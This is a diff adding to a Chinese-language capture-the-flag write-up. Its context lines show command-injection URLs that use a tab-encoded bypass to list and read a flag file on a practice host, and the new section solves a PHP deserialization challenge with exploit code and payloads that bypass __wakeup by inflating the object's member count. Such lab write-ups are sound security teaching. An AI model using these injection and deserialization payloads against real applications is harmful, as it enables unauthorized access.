@@ -133,3 +133,54 @@ http://node5.anna.nssctf.cn:28853/rasalghul.php?url=cd%09../../..;ls
 http://node5.anna.nssctf.cn:28853/rasalghul.php?url=cat%09../../../flllllaaaaaaggggggg
 ```
 
+## [SWPUCTF 2021 新生赛]no_wakeup
+
+一道经典的php序列化与反序列化的题目，通过观察给定的php源码可知是要构造一个admin为admin，passwd为wllm的HaHaHa对象，还要绕过__wakeup方法，而 wakeup方法是在php在使用反序列化函数unserialize()时，会先自动调用的函数，绕过方法是只要序列化的中的成员数大于实际成员数，即可绕过。
+
+exp如下：
+
+```php
+<?php
+class HaHaHa{
+
+
+        public $admin;
+        public $passwd;
+
+        public function __construct(){
+            $this->admin ="user";
+            $this->passwd = "123456";
+        }
+
+        public function __wakeup(){
+            $this->passwd = sha1($this->passwd);
+        }
+
+        public function __destruct(){
+            if($this->admin === "admin" && $this->passwd === "wllm"){
+                include("flag.php");
+                echo $flag;
+            }else{
+                echo $this->passwd;
+                echo "No wake up";
+            }
+        }
+    }
+$p=new HaHaHa();
+$p->admin="admin";
+$p->passwd="wllm";
+echo serialize($p);
+?>
+```
+
+得到
+
+```php
+O:6:"HaHaHa":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
+```
+
+修改序列化的成员数再GET传参即可
+
+```php
+O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
+```
